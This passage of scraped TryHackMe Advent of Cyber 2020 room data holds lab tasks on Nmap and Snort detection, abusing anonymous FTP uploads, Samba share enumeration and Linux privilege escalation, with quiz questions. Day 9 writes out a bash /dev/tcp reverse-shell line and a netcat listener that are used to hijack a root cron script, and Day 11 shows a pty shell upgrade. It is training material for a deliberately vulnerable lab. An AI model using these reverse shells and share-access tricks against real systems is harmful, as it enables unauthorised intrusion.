src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/pfsense_rules.png" alt style="width:100%" /></span><br />\n<span><em>A list of Snort rules installed on a pfSense firewall.</em></span></p>\n<p>For example, detecting the Metasploit payload for <a href="https://nvd.nist.gov/vuln/detail/CVE-2013-3205">CVE 2013-3205</a>:<br />\n<span><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/cve_2013.png" alt /></span><br />\n<span><em>The emerging threat rule to detect the Metasploit payload for CVE-2013-3205.</em></span></p>\n<p>If properly configured, a majority of Nmap scans can be detected. This is especially true when using an aggressive timing template such as <code>-T4</code> or <code>-T5</code>. Let\'s take a look at the following Nmap scan being detected: <code>nmap -A 192.168.1.171</code><br />\n<span><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/nmap_scan.png" alt /></span><br />\n<span><em>Starting an Nmap scan to the pfSense firewall.</em></span></p>\n<p>After returning to pfSense a few seconds later, we notice that alerts are being generated by Snort:<br />\n<span><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/snort_list.png" alt style="width:100%" /></span><br />\n<span><em>Viewing newly created alerts by Snort as a result of the Nmap scan.</em></span></p>\n<p>Even with a timing template of<code>-T3</code>, Snort is capable of detecting the port scan, where after 6 alerts (in this case) the attacker is then blocked by the firewall.<br />\n<span><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/snort_blocked.png" alt style="width:100%" /></span><br />\n<span><em>After 6 alerts, Snort blocks the IP address running the Nmap scan from contacting the pfSense firewall.</em></span></p>\n<p><span><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/nmap_blocked.png" alt /></span><br />\n<span><em>Confirming that the IP address running the Nmap scan can no longer contact the pfSense firewall.</em></span><br />\n<br /></p>\n<h2><strong>8.9. Challenge</strong></h2>\n<p><strong>Deploy</strong> and use Nmap to scan the instance attached to this task. Take a note of the IP address to scan: <code>MACHINE_IP</code> and enumerate it for Elf McEager!</p>\n<p><em>Optional bonus</em>: As a result of Elf McEager managing to recover Christmas in "<em>Day 7 - The Grinch Really Did Steal Christmas</em>", TBFC\'s website has been restored for all the elves to visit. Can you find it? I hear it\'s quite the read... You must add <code>MACHINE_IP   tbfc.blog</code> to your <strong>/etc/hosts</strong> file before the application will load like below:<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-9/hosts.png" alt="hosts" /></p>\n', 'taskType': 'vm', 'taskNo': 10, 'taskCreated': '2020-11-12T02:48:04.356Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fbf3ccc3e0a047b6372bd2c', 'questions': [{'questionNo': 1, 'question': '<p>When was Snort created?</p>\n', 'hint': ''}, {'questionNo': 2, 'question': '<p>Using Nmap on MACHINE_IP , what are the port numbers of the three services running?\xa0 (Please provide your answer in ascending order/lowest -&gt; highest, separated by a comma)</p>\n', 'hint': 'Answer format: <port>,<port>,<port>'}, {'questionNo': 3, 'question': '<p>Run a scan and provide the <code>-Pn</code> flag to ignore ICMP being used to determine if the host is up</p>\n', 'hint': "Remember that just because a device doesn't respond to ICMP, doesn't mean it isn't online. Windows machines block ICMP by default."}, {'questionNo': 4, 'question': '<p>Experiment with different scan settings such as<code>-A</code> and <code>-sV</code>\xa0whilst comparing the outputs given.</p>\n', 'hint': ''}, {'questionNo': 5, 'question': '<p>Use Nmap to determine the name of the Linux distribution that is running, what is reported as the most likely distribution to be running?</p>\n', 'hint': 'Service Fingerprinting!'}, {'questionNo': 6, 'question': '<p>Use Nmap\'s <strong>N</strong>etwork <strong>S</strong>cripting <strong>E</strong>ngine (<strong>NSE</strong>) to retrieve the "<strong>HTTP-TITLE</strong>" of the webserver. Based on the value returned, what do we think this website might be used for?</p>\n', 'hint': 'https://nmap.org/nsedoc/scripts/http-title.html'}, {'questionNo': 7, 'question': '<p>Now use different scripts against the remaining services to discover any further information about them</p>\n', 'hint': ''}]}, {'taskTitle': '[Day 9] <span class="badge badge-soft-warning size-16">Networking</span> Anyone can be Santa!', 'taskDesc': '<h3><a href="https://www.youtube.com/watch?v=i-jqFYTPEV4">Watch DarkStar\'s Video On Solving This Task</a><br /><br /></h3><p><u>Day 9: Anyone can be Santa - Prelude:<br /></u><br />\n\ufeffEven Santa has been having to adopt the "work from home"\xa0ethic in 2020. To help Santa out, Elf McSkidy and their team created a file server for The Best Festival\xa0Company (TBFC) that uses the FTP protocol.\xa0However, an attacker was able to hack this new server. Your mission, should you choose to accept it, is\xa0to understand how this hack occurred and to retrace the steps of the attacker.</p>\n<p><u><strong>9.1.</strong> Getting Started</u><br />\nBefore we begin, we\'re going to need to deploy two Instances:</p>\n<ol>\n<li>The THM AttackBox by pressing the "<strong>Start AttackBox</strong>" button at the top-right of the page.</li>\n<li>The vulnerable Instance attached to this task by pressing the "<strong>Deploy</strong>" button at the top-right of this task/day.</li>\n</ol>\n<p>Made with ❤ by <a href="https://tryhackme.com/p/cmnatic">CMNatic</a></p>\n<hr />\n<p><u><strong>9.2.</strong>\xa0Today\'s Learning Objectives:</u><br />\nUnderstand the fundamentals of an FTP file server and some common misconfigurations to ultimately exploit these ourselves to gain entry to <em>tbfc-ftp-01.</em></p>\n<p><br /><br />\n<u><strong>9.3.</strong> What is FTP &amp; Where is it Used?</u><br />\nThe File Transfer Protocol (FTP) offers a no-thrills means of file sharing in comparison to alternative<br />\nprotocols available. Whilst this protocol is unencrypted, it can be accessed through a variety of means; from dedicated software like FileZilla, the command line, or web browsers, FTP Servers have been long used to share files between devices across the Internet due to its compatibility.</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-10/replace/browser.png" alt style="width:100%" /><br />\n<em>Accessing an FTP server using the Mozilla Firefox Web Browser.</em></p>\n<p>FTP uses two connections when transferring data, as illustrated below:</p>\n<p><img src="https://cyberhoot.com/wp-content/uploads/2020/02/main-qimg-0fdf2c9fdedff2f4576874b57c662bbf.png" alt /><br />\n<a href="https://cyberhoot.com/wp-content/uploads/2020/02/main-qimg-0fdf2c9fdedff2f4576874b57c662bbf.png">(Cyberhoot., 2020)</a></p>\n<p>The standard for these two connections are the two ports:</p>\n<ul>\n<li>Port 20 (Data)</li>\n<li>Port 21 (Commands)</li>\n</ul>\n<p>Commands involve actions such as listing or navigating directories, writing to files. Whereas, the data port is where actual data such as the downloading/uploading of files are transferred over.</p>\n<p><br /><br />\n<u><strong>9.4</strong>. No Credentials? No Problem!\xa0</u><br />\nBefore any data can be shared, the client must log in to the FTP Server. This is to determine the commands that the client has the permission to execute, and the data that can be shared.\xa0Some websites use FTP to share files instead of the web server itself. Of course, this means that you\'d have to share a username/password through some other way - that\'s not practical.</p>\n<p>Enter FTP\'s "Anonymous" mode...This setting allows a default username to be used with any password by a client. This user is treated like any other user on the FTP server - including enforcing permissions and privileges to commands and data.</p>\n<p><br /><br />\n<u><strong>9.5</strong>. Using FTP Over Terminal</u><br /><br />\n<br /><br />\n<br /><br />\n<br /><br />\nWe\'re going to be using the "FTP" package that comes installed on most Linux environments but especially the THM AttackBox.To connect, we simply use <code>ftp</code> and provide the IP address of the Instance. In my case, I would use <code>ftp 10.10.185.239</code>, but you would need to use <code>ftp MACHINE_IP</code> for your vulnerable Instance.</p>\n<p>When prompted for our "<strong>Name</strong>", we enter "<strong>anonymous</strong>". If successful, we have confirmed that the FTP Server has "anonymous" mode enabled - successful login looking like so:</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-10/img2.png" alt /></p>\n<p>You can use the\xa0<code>help\xa0</code>command to list some of the commands you can run whilst connected to the FTP Server. Here\'s a quick rundown of the fundamentals:</p>\n<table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>ls</td>\n<td>List files and directories in the working directory on the FTP server</td>\n</tr>\n<tr>\n<td>cd</td>\n<td>Change our working directory on the FTP server</td>\n</tr>\n<tr>\n<td>get</td>\n<td>Download a file from the FTP server to our device</td>\n</tr>\n<tr>\n<td>put</td>\n<td>Upload a file from our device to the FTP server</td>\n</tr>\n</tbody>\n</table>\n<p>Let\'s look at the directories available to us using\xa0<code>ls</code>. There is only one folder with data that our user has permission to access:<br />\n<img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-10/img3.png" alt /></p>\n<p>We\'ll navigate to this using\xa0<code>cd</code>\xa0to change our working directory and then\xa0\xa0<code>ls</code>\xa0to list the contents. The file within this folder contains a file with a\xa0<strong>".sh"</strong>\xa0extension. This extension is a shell script, that when executed, will run commands that we program. Let\'s use\xa0<code>get</code> <strong>to get</strong>\xa0the file from the server onto our device, so we understand why this file has been left here!</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-10/img4.png" alt /></p>\n<p><br /><br />\n<u>9.6. Finding our Exploit</u><br />\nWith the file downloaded, let\'s open it on our device using a terminal text editor such as nano.</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-10/img5.png" alt /></p>\n<p>We don\'t need to understand what happens here outside of the comments. The script executes every minute (according to Elf McEager), creates a backup of a folder and stores it in Elf McEager\'s home directory. What if we were to replace the commands executed in this script with our own, malicious commands? Uploading a file requires separate permission that shouldn\'t be granted to the "anonymous" user. However, permissions are very easy to oversight - such as in the case here.</p>\n<p><strong>9.6.1.</strong> Let\'s use <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp">pentesters cheatsheet</a> to get a good command that will be executed by the server to<br />\ngenerate a shell to our AttackBox, replacing the IP_ADDRESS with your TryHackMe IP, this address is displayed on the navigation bar on the <a href="https://tryhackme.com/access">Access page</a>.</p>\n<p><code>bash -i &gt;&amp; /dev/tcp/Your_TryHackMe_IP/4444 0&gt;&amp;1</code></p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-10/img6.png" alt /></p>\n<p><strong>9.6.2.</strong> Let\'s set up a <code>netcat</code> listener to catch the connection on our AttackBox: <code>nc -lvnp 4444</code></p>\n<p><strong>9.6.3.</strong> We\'ll now attempt to upload our malicious script to the folder that we have write permissions on the FTP server by returning to our FTP prompt<br />\nand using\xa0<code>put</code> <strong>to put</strong>\xa0the file into that directory (ensuring it is your current directory).</p>\n<p><strong>9.6.4.</strong>\xa0Return to our <code>netcat</code> listener, after waiting one minute, you should see an output like below! Success! We have a reverse system shell on the FTP Server as the most powerful user. Any commands you now use will execute on the FTP server\'s system.</p>\n<p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-10/img9.png" alt /></p>\n<p>Proceed to use commands similar to what we have used before to find the contents of root.txt located in the root directory! Let\'s break down exactly what happened here and explain the reasons as why this exploit happened:</p>\n<p><strong>9.6.5.1.</strong> The FTP Server has anonymous mode enabled allowing us to authenticate. This isn\'t inherently<br />\ninsecure and has many legitimate uses.</p>\n<p><strong>9.6.5.2</strong>. We\'ve discovered that we have permission to upload and download files. Whilst is also normal behaviour for FTP servers, anonymous users should not be able to upload files.</p>\n<p><strong>9.6.5.3.</strong> We\'ve interpreted the information from a legitimate backup script to create a reverse shell onto our host.</p>\n<p><strong>9.6.5.4.</strong> The script executes as the "root" user - the most powerful on a Linux system. This is also a vulnerability, as now we have full access to the system. The use of this user should be restricted wherever possible. If the script were to execute as "elfmceager", we\'d only have access to the system as that user (a much less powerful one in comparison)</p>\n<p><br /><br />\n<u><strong>9.7.</strong>\xa0Conclusion, where to go from here and additional Material:</u><br />\nWe\'ve covered the fundamentals of FTP servers and why they\'re still used today. Not only this, but<br />\nwe\'ve also learned how simple misconfigurations can lead to a full-blown hack on an FTP Server.\xa0If you\'re keen to learn more, the\xa0<a href="https://tryhackme.com/room/networkservices">Network Services</a>\xa0walkthrough room (created by\xa0<a href="https://tryhackme.com/p/PoloMints">Polomints</a>) also covers FTP. If you wish to sharpen your skills,<br />\nyou may find the "<a href="https://tryhackme.com/room/anonymous">Anonymous</a>" Challenge room (created by\xa0<a href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a>) a fun dojo.</p>\n', 'taskType': 'vm', 'taskNo': 11, 'taskCreated': '2020-11-12T02:48:10.871Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5fb2dbf006f5193205e836c0', 'questions': [{'questionNo': 1, 'question': '<p><strong>Question #1:</strong>\xa0Name the directory on the FTP server that has data accessible by the "anonymous" user</p>\n', 'hint': 'Recall how Linux indicates permissions to files and folders from Day 8!'}, {'questionNo': 2, 'question': '<p><strong>Question #2:</strong>\xa0What script gets executed within this directory?</p>\n', 'hint': ''}, {'questionNo': 3, 'question': '<p><strong>Question #3:</strong>\xa0What movie did Santa have on his Christmas shopping list?</p>\n', 'hint': 'Look around for other files!'}, {'questionNo': 4, 'question': "<p><strong>Question #4:</strong>\xa0Re-upload this script to contain malicious data (just like we did in section <strong>9.6</strong>. Output the contents of /root/flag.txt!</p>\n<p>Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.</p>\n", 'hint': ''}]}, {'taskTitle': '[Day 10] <span class="badge badge-soft-warning size-16">Networking</span> Don\'t be sElfish!', 'taskDesc': '<p></p><div style="text-align:center"><img src="https://tryhackme.com/img/events/christmas/tree.png" alt style="font-size:1rem;width:203.161px;height:225.734px" /></div>\n<u><div style="text-align:center"><u><b>Day 10: Don\'t be so sElfish - Prelude<br /><br /></b></u></div></u><div style="text-align:center"><em>The Best Festival Company</em><span style="font-size:1rem">\xa0(TBFC) has since upscaled its IT infrastructure after last year\'s attack for all the other elves to use, including a VPN server and a few other services. You breathe a sigh of relief...</span><em>"That\'s it, Me, Elf McEager saved the Christmas of 2020! I can\'t wait to---"</em></div>\n<p></p>\n<p style="text-align:center"><em><strong>But suddenly, a cold shiver runs\xa0down your spine, interrupting your monologue...</strong></em></p>\n<p style="text-align:center"><span class="colour" style="color:rgb(33, 37, 41)">You suddenly recall that Elf McSkidy had set up a Samba file server just before the attack occurred - could this have been hacked too?!\xa0 What about our data...Oh no,\xa0<strong>quick!</strong>\xa0Find out what usernames may have been leaked and attempt to login to the server yourself, noting down any vulnerabilities found to report back to Elf McSkidy.</span></p><p style="text-align:center"><a href="https://www.youtube.com/watch?v=HscyCbModk4">Watch DarkStars video on solving this task!</a></p>\n<p><u>10.1. Getting Started:</u><br />\nBefore we begin, we\'re going to need to deploy two Instances:</p>\n<ol>\n<li>The THM AttackBox by pressing the "\xa0<strong>Start AttackBox</strong>" button at the top-right of the page.</li>\n<li>The vulnerable Instance attached to this task by pressing the "<strong>Deploy</strong>" button at the top-right of this task/day.</li>\n</ol>\n<p><br /><u>10.2. Today\'s Learning Objectives:</u><br />\nLearn about the basics of network file sharing protocols before getting hands-on with Samba, where you will be enumerating "<em>tbfc-smb-01"</em>\xa0:\xa0a vulnerable Samba server to gain un-authorised access.</p>\n<p><span class="colour" style="color:rgb(33, 37, 41)">Made with\xa0❤ by\xa0<a href="https://tryhackme.com/p/cmnatic">CMNatic</a></span></p>\n<hr />\n<p><u>10.3. What is Samba &amp; where is it Used?</u><br /><br />Whilst we learnt about one of the most commonplace protocols that are used for file-sharing on Day 10, we\'ll be covering an alternative technology for file-sharing that is most used within organisation/company networks. Offering encryption as standard, this technology consists of two protocols:</p>\n<ul>\n<li>SMB (Server Message Block) - Natively supported by Windows and not Linux</li>\n<li>NFS (Network File System) - Natively supported by Linux and not Windows</li>\n</ul>\n<p><span class="colour" style="color:rgb(33, 37, 41)">Protocols such as SMB send "requests" and "responses" when communicating with each other, as illustrated below:</span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)"><img src="https://cdn.ttgtmedia.com/rms/onlineImages/networking-smb_mobile.jpg" alt /></span></p>\n<p><em><a href="https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol"><span style="font-size:12px">(TechTarget., 2017)</span></a><br /></em><br />\nWhat makes Samba so popular and useful is that it removes the differences between these two protocols, meaning that the two operating systems can now share resources including files amongst each other.\xa0Simply, Samba connects to a "<strong>share</strong>" (think of this as a virtual folder) and is capable of day-to-day activities like deleting, moving or uploading files.</p>\n<p><span class="colour" style="color:rgb(33, 37, 41)">Samba is flexible in the sense it can be useful for both you and me or businesses with thousands of employees. For example, employees can access documents from a central computer rather than each employee storing their own copy. As previously mentioned, this technology is encrypted enabling sensitive data like username and passwords used in the authentication process (and the data itself)\xa0 to be communicated between client/server securely.</span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)">Unlike FTP, other IT devices such as network printers can also be shared between client/server.</span></p>\n<hr />\n<p><u>10.4. Searching for Samba Shares</u><br />\nWe\'re going to be using the\xa0<em>enum4linux</em>\xa0tool that is already provided to you on the THM AttackBox. Let\'s get our hands dirty!<br />\n<br /></p>\n<ol>\n<li>Open a terminal prompt and navigate to enum4linux:\xa0<code>cd /root/Desktop/Tools/Miscellaneous</code></li>\n<li>Run enum4linux and list all the possible options we could use, take time to study these for anything<br />\ninteresting:\xa0\xa0<code>./enum4linux.pl -h</code></li>\n</ol>\n<p><span class="colour" style="color:rgb(33, 37, 41)"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-11/img1.png" alt style="width:769px;height:444.98px" /></span></p>\n<p>Note how we can use options like\xa0<code>-S</code>\xa0to list shares or\xa0<code>-U</code>\xa0(note the uppercase) to list possible users. In<br />\nmy example, I want to find out who can be used to access the server through Samba:\xa0<code>./enum4linux.pl -U MACHINE_IP</code></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-11/img2.png" alt style="width:762px;height:288.928px" /></span><br />\n<span class="colour" style="color:rgb(33, 37, 41)">Note how\xa0<em>enum4linux</em>\xa0has discovered four users in my example...One of these users may have a weak password such as "password123" that we can log in with and access sensitive data as.</span><br />\n<span class="colour" style="color:rgb(33, 37, 41)"><strong>1.</strong>\xa0jjohns</span><br />\n<span class="colour" style="color:rgb(33, 37, 41)"><strong>2.</strong>\xa0lbutton</span><br />\n<span class="colour" style="color:rgb(33, 37, 41)"><strong>3.</strong>\xa0jfrost</span><br />\n<span class="colour" style="color:rgb(33, 37, 41)"><strong>4.</strong> cmnatic</span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)">And as a result of further enumeration with\xa0<em>enum4linux</em>, we\'ve discovered the following three shares!</span><br />\n<span class="colour" style="color:rgb(33, 37, 41)"><strong>1.</strong>\xa0homes</span><br />\n<span class="colour" style="color:rgb(33, 37, 41)"><strong>2.</strong>\xa0share1</span><br />\n<span class="colour" style="color:rgb(33, 37, 41)"><strong>3.</strong>\xa0IPC$</span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-11/img3.png" alt style="width:773px;height:193.069px" /></span><br />\n<em>Now it\'s your turn, scan your Instance (<strong>MACHINE_IP</strong>) to answer\xa0<strong>Question #1</strong>\xa0and\xa0<strong>Question #2</strong>. Remember the options that</em><br />\nwe can use with\xa0<code>enum4linux.pl</code>\xa0<em>!</em></p>\n<hr />\n<p><span class="colour" style="color:rgb(33, 37, 41)"><u>10.5. Connecting to a Share</u></span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)">We\'ve already learnt two key pieces of information from the previous section:</span><br /></p>\n<ul>\n<li>Usernames to authenticate as</li>\n<li>Shares that we can access (remembering that shares most likely contain data)</li>\n</ul>\n<p><span class="colour" style="color:rgb(33, 37, 41)">However, a very common and easy to cause vulnerability by administrators is wrong permissions. You may be\xa0able to access a share and its data without logging in at all, such as we will demonstrate below:</span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)"><strong>1.</strong>\xa0Remember that the IP address of the Samba server is that of the Instance\xa0 you deployed (<strong>MACHINE_IP</strong>)</span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)"><strong>2.</strong>\xa0Use the\xa0<em>smbclient</em>\xa0tool to begin accessing the Samba server and its shares, replacing "<strong>sharename</strong>" with the name of the share you wish to access:\xa0<code>smbclient //REPLACE_INSTANCE_IP_ADDRESS/**sharename**</code></span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)"><strong>3.</strong>\xa0You will be asked for a password, the easiest password is no password!\xa0<strong>We can just press</strong>\xa0"<strong>Enter</strong>" to test this theory. If successful, this means that the share requires no authentication and we are now logged in.</span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)"><em>For example, accessing\xa0<strong>"share1"</strong>\xa0on another device:</em></span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)"><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-11/img4.png" alt />\xa0|</span></p>\n<p><span class="colour" style="color:rgb(33, 37, 41)">You can use the\xa0<code>help</code>\xa0command to list some of the commands you can run whilst connected to the Samba share. Here\'s a quick rundown of the fundamentals:</span></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Command</td>\n<td>Description</td>\n</tr>\n<tr>\n<td>ls</td>\n<td>List files and directories in the current location</td>\n</tr>\n<tr>\n<td>cd &lt;directory&gt;</td>\n<td>Change our working directory</td>\n</tr>\n<tr>\n<td>pwd</td>\n<td>Output the full path to our working directory</td>\n</tr>\n<tr>\n<td>more &lt;filename&gt;</td>\n<td>Find out\xa0<strong>more</strong>\xa0about the contents of a file. To close the open file, you press\xa0<code>:q</code></td>\n</tr>\n<tr>\n<td>get &lt;filename&gt;</td>\n<td>Download a file from a share</td>\n</tr>\n<tr>\n<td>put &lt;filename&gt;</td>\n<td>Upload a file from a share</td>\n</tr>\n</tbody>\n</table>\n<p><br /></p><p>You can now proceed to answer\xa0<strong>Question #3</strong>\xa0and\xa0<strong>Question #4</strong></p>\n<hr />\n<p><u>10.6. Conclusion, where to go from here and additional Material:<br /></u><br />\nYou\'ve learned the fundamentals of how a very commonplace protocol used by computing devices works, and ultimately, can be leveraged through the use of enumeration and misconfiguration.\xa0With this said, you might be surprised to learn that even printers can use the protocols behind Samba.\xa0<a href="https://tryhackme.com/p/Swafox">Swafox</a>\xa0has created a lovely room on\xa0<a href="https://tryhackme.com/room/printerhacking101">Printer Hacking 101</a>.</p>\n<p><span class="colour" style="color:rgb(33, 37, 41)">There\'s no truer statement in pentesting that practice makes perfect.\xa0 Not only can you use the tools within this room, why not give a few others a try and apply your knowledge in the "<a href="https://tryhackme.com/room/kenobi">Kenobi</a>" Walkthrough room or the "<a href="https://tryhackme.com/room/anonymous">Anonymous</a>"Challenge room (CTF)</span></p>\n', 'taskType': 'vm', 'taskNo': 12, 'taskCreated': '2020-11-12T02:48:21.508Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5faca2408762ca637e303fc6', 'questions': [{'questionNo': 1, 'question': '<p><span style="font-weight:bolder;font-size:1rem">Question #1\xa0</span>Using\xa0<em>enum4linux</em>, how many users are there on the Samba server (<code>MACHINE_IP</code>)?</p>\n', 'hint': ''}, {'questionNo': 2, 'question': '<p><span style="font-weight:700;font-size:1rem">Question #2\xa0</span>Now how many "shares" are there on the Samba server?</p>\n', 'hint': ''}, {'questionNo': 3, 'question': '<p><span style="font-weight:700;font-size:1rem">Question #3\xa0</span>Use\xa0<em>smbclient</em>\xa0to try to login to the shares on the Samba server (<code>MACHINE_IP</code>). What share doesn\'t require a password?</p>\n', 'hint': ''}, {'questionNo': 4, 'question': '<p><span style="font-weight:700;font-size:1rem">Question #4\xa0</span>Log in to this share, what directory did ElfMcSkidy leave for Santa?</p>\n', 'hint': 'Refer to the commands in the cheatsheet if you are stuck!'}]}, {'taskTitle': '[Day 11] <span class="badge badge-soft-warning size-16">Networking</span> The Rogue Gnome', 'taskDesc': '<p><br /><img src="https://www.misskatecuttables.com/uploads/shopping_cart/7689/large_garden-gnome.png" alt class="note-float-right" style="float:right;width:378.672px;height:378.672px" /><span style="font-size:2rem">Day 11 - The Rogue Gnome: Prelude</span></p><h2><p style="font-size:16px">This is it - the moment that Elf McEager has been waiting for. It\'s the final exam of the Nmap course that he enlisted on during "<em>Day 8 - What\'s Under the Christmas Tree?</em>". It looks like all that hard work of hitting the books has paid off..."Success!" Elf McEager screams..."the exploit worked! Yippeee!"</p><p style="font-size:16px">Elf McEager has successfully managed to create a reverse shell from the target back to his computer. Little did he know, the real exam begins now...The last stage of the exam requires Elf McEager to escalate his privileges! He spent so much time studying Nmap cheatsheets that he\'s now drawing a blank...Can you help Elf McEager?</p><p style="margin-bottom:1rem;font-size:16px"><i>To be the good guy, sometimes you gotta be the bad guy first...</i></p></h2><h3><span style="font-size:16px"><a href="https://www.youtube.com/watch?v=_SMxZPne5QU" target="_blank">Watch DarkStar\'s Video On Solving This Task</a></span></h3><h3><span style="font-size:16px"><br /></span></h3><h2>11.1. Getting Started:</h2><p>Before we begin, we\'re going to need to deploy two Instances:</p><ol><li>The THM AttackBox by pressing the "<span style="font-weight:bolder">Start AttackBox</span>" button at the top-right of the page.</li><li>The vulnerable Instance attached to this task by pressing the "<span style="font-weight:bolder">Deploy</span>" button at the top-right of this task/day.</li></ol><h2>11.2. Today\'s Learning Objectives:</h2><p>We\'re going to be learning the fundamentals of privilege escalation, what it entails and how it is used day-to-day without you even realising in legitimate circumstances. After covering the fundamentals of Linux file permissions and understanding why we may want to escalate our privileges as a pentester, we\'re going to put our theory into practice by abusing a common file permission misconfiguration on Linux.</p><p>Made with ❤ by\xa0<a href="https://tryhackme.com/p/cmnatic">CMNatic</a></p><hr style="border:1px solid var(--main-color)" /><h3>11.3. What is Privilege Escalation?</h3><p>You may be surprised to find out that privilege escalation is something that you do daily. On computing systems, there is a general rule of thumb that determines how someone interacts with a computer system and the resources within it. There are two primary levels of permissions that a person may have to a computer system:</p><ul><li>User</li><li>Administrator</li></ul><p>Generally speaking, only Administrators can modify system settings or change the permissions of other users resources like files and folders.</p><p>Users may be further divided into roles such as within a company. Staff in HR are only able to access HR documents whereas accounting staff are only able to access accounting resources.</p><p>Privilege escalation is\xa0<em>simply</em>\xa0the process of increasing the current privileges we have to permissions above us. In the screenshot below, we are escalating our privileges to Administrator to run Command prompt on Windows 10:</p><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img1.png" alt /></p><p><em>A normal process of privilege escalation</em></p><p>As a pentester, we often want to escalate our privileges to that of another user or administrator to have full access to a system. We can discover and abuse misconfigurations or bugs within a system to escalate these privileges where this shouldn\'t be possible otherwise.<br /><br /></p><h2>11.4. The directions of privilege escalation</h2><p>The process of escalating privileges isn\'t as clear-cut as going straight from a user through to administrator in most cases. Rather, slowly working our way through the resources and functions that other users can interact with.<br /><br /></p><h3>11.4.1. Horizontal Privilege Escalation:</h3><p>A horizontal privilege escalation attack involves using the intended permissions of a user to abuse a vulnerability to access another user\'s resources who has similar permissions to you. For example, using an account with access to accounting documents to access a HR account to retrieve HR documents. As the difference in the permissions of both the Accounting and HR accounts is the data they can access, you aren\'t moving your privileges upwards.<br /><br /></p><h3>11.4.2. Vertical Privilege Escalation:</h3><p>A bit more traditional, a vertical privilege escalation attack involves exploiting a vulnerability that allows you to perform actions like commands or accessing data acting as a higher privileged account such as an administrator.</p><p>Remember the attack you performed on "<em>Day 1 - A Christmas Crisis</em>"? You modified your cookie to access Santa\'s control panel. This is a fantastic example of a vertical privilege escalation because you were able to use your user account to access and manage the control panel. This control panel is only accessible by Santa (an administrator), so you are moving your permissions upwards in this sense.<br /><br /></p><h2>11.5. Reinforcing the Breach</h2><p>A common issue you will face in offensive pentesting is instability. The very nature of some exploits relies on a heavy hand of luck and patience to work. Take for example the Eternalblue exploit which conducts a series of vulnerabilities in how the Windows OS allocates and manages memory. As the exploit writes to memory in an in-proper way, there is a chance of the computer crashing. We\'ll showcase a means of stabilising our connection in the section below.</p><p>Let\'s exploit a local copy of a\xa0<a href="http://www.dvwa.co.uk/" target="_blank">DVWA\xa0(Damn Vulnerable\xa0Web\xa0App)</a>\xa0and use a vulnerability called command injection to create a reverse connection to our device. Highlighted in red is the system command to utilise Netcat to connect back to our attacking machine:</p><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img2.png" alt /></p><p>Verifying a successful reverse connection, we execute two initial commands to get a bit of insight as to how we should progress:</p><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img3.png" alt /></p><p>Executing the\xa0<code style="font-size:14px">whoami</code>\xa0command allows us to see what the name of the account that we are executing commands as.\xa0<code style="font-size:14px">echo $0</code>\xa0informs us of our shell - it is currently a\xa0<code style="font-size:14px">/bin/sh</code>. This is a simple shell in comparison to a "<span style="font-weight:bolder">/bin/bash</span>". In shells like our current Netcat, we don\'t have many luxuries such as tab-completion and re-selecting the last command executed (using the up-arrow), but importantly, we can\'t use commands that ask for additional input i.e. providing SSH credentials or using the substitute user command\xa0<code style="font-size:14px">su</code></p><p>Modern Ubuntu installs come with python3 installed, we can spawn another shell and begin to make it interactive:<br /><code style="font-size:14px">python -c \'import pty; pty.spawn("/bin/bash")\'</code></p><p><img src="https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img4.png" alt /><br />There are\xa0<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys">many ways you can make your shell interactive</a>\xa0if Python is not installed.<br /><br /></p><h2>11.6. You Thought Enumeration Stopped at Nmap?</h2><p>Wrong! We were just getting started. After gaining initial access, it\'s essential to begin to build a picture of the internals of the machine. We can look for a plethora of information such as other services that are running, sensitive data including passwords, executable scripts of binaries to abuse and more!</p><p>For example, we can use the find command to search for common folders or files that we may suspect to be on the machine:</p><ul><li>backups</li><li>password</li><li>admin</li><li>config</li></ul><p>Our vulnerable machine in this example has a directory called backups containing an SSH key that we can use for authentication. This was found via:\xa0<code style="font-size:14px">find / 